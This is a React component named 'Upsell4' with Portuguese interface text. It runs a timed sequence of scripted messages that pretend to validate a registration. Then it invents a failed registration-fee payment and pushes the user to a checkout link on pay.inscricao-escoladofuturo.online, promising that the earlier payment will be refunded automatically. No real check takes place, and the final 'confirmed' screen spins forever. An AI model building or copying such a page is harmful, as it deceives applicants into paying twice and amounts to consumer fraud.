import React, { useState, useEffect } from 'react';
import useUtmNavigator from '../hooks/useUtmNavigator';

const Upsell4: React.FC = () => {
  const navigate = useUtmNavigator();
  const [step, setStep] = useState(1);

  useEffect(() => {
    const timer1 = setTimeout(() => setStep(2), 3000);
    const timer2 = setTimeout(() => setStep(3), 6000);
    const timer3 = setTimeout(() => setStep(4), 9000);

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
    };
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="max-w-md w-full space-y-4">
        {/* First Message */}
        <div className="bg-white rounded-lg p-4 flex items-center gap-3">
          <div className="text-green-600">
            <svg viewBox="0 0 24 24" fill="none" className="w-6 h-6">
              <path d="M20 6L9 17L4 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <div>
            <h2 className="font-semibold">Inscrição Realizada com Sucesso</h2>
            <p className="text-gray-500 text-sm">Aguarde um momento...</p>
          </div>
        </div>

        {/* Second Message */}
        {step >= 2 && (
          <div className="bg-white rounded-lg p-4 flex items-center gap-3">
            <div className="text-red-500">
              <svg viewBox="0 0 24 24" fill="none" className="w-6 h-6">
                <path d="M6 18L18 6M6 6L18 18" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
            <div>
              <h2 className="font-semibold">Validação dos Dados Pessoais</h2>
              <p className="text-gray-500 text-sm">Estamos verificando as informações...</p>
            </div>
          </div>
        )}

        {/* Third Message */}
        {step >= 3 && (
          <div className="bg-white rounded-lg p-4">
            <div className="text-red-600 font-semibold mb-2">
              Houve um problema na identificação do pagamento da taxa de inscrição.
            </div>
            <p className="text-gray-600 text-sm mb-4">
              Corrija o pagamento da taxa para que sua inscrição seja confirmada.
            </p>
            <button
              onClick={() => window.location.href = 'https://pay.inscricao-escoladofuturo.online/DPXw3Xeo2qLZzmp'}
              className="w-full bg-[#4CAF50] text-white py-3 rounded-md font-medium"
            >
              Ir para o Checkout
            </button>
            <p className="text-gray-400 text-xs text-center mt-2">
              (O valor pago anteriormente será reembolsado automaticamente.)
            </p>
          </div>
        )}

        {/* Fourth Message */}
        {step >= 4 && (
          <div className="bg-white rounded-lg p-4 flex items-center gap-3">
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-gray-300 border-t-gray-600"></div>
            <div>
              <h2 className="font-semibold">Inscrição Confirmada</h2>
              <p className="text-gray-500 text-sm">Aguardando finalização do processo...</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Upsell4;